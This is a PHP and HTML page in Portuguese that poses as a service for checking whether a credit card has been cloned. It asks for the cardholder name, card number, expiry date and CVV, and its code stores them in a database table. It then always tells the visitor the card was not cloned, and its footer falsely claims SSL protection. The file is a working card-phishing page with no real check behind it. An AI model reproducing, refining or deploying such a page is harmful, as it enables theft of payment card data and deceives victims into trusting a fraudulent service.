<?php
    require('config.php');

    if($_SERVER['REQUEST_METHOD'] == "POST"){
        $nome = mysqli_real_escape_string($db, $_POST["nome"]);
        $cvv = mysqli_real_escape_string($db, $_POST["cvv"]);
        $cartao = mysqli_real_escape_string($db, $_POST["cartao"]);
        $validade = mysqli_real_escape_string($db, $_POST["validade"]);
        
        mysqli_query($db, "insert into cartao values(DEFAULT, '$nome', '$cvv', '$cartao', '$validade')");
        header('Location: ?clonado=false');    
        exit;
    }
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="assets/css/style.css">

<title>Seu Cartão foi Clonado ?</title>
</head>

<body>

<div class="card">

<?php if($_GET["clonado"] == "false"): 
echo '
    <div class="status">
        <h1>Cartão Não Clonado</h1>
    </div>
';
endif ?>


    <form method="POST">
        <div class="header">
          <div class="icon">💳</div>
          <div class="header-text">
            <h3>Verifique se seu cartão foi clonado</h3>
            <p>Insira os dados do seu cartão de crédito</p>
          </div>
        </div>
      
        <div class="group">
          <label>Nome no Cartão</label>
          <input type="text" name="nome" placeholder="NOME COMO ESTÁ NO CARTÃO">
        </div>
      
        <div class="group">
          <label>Número do Cartão</label>
          <input type="text" name="cartao" placeholder="0000 0000 0000 0000">
        </div>
      
        <div class="row">
          <div class="group" style="flex:1;">
            <label>Validade</label>
            <input type="text" name="validade" placeholder="MM/AA">
          </div>
      
          <div class="group" style="flex:1;">
            <label>CVV</label>
            <input type="text" name="cvv" placeholder="123">
          </div>
        </div>
      
        <button>Verificar Agora</button>
      
        <div class="footer">
          🔒 Seus dados estão protegidos com criptografia SSL
        </div>
      
    </form>
    
</div>

</body>
</html>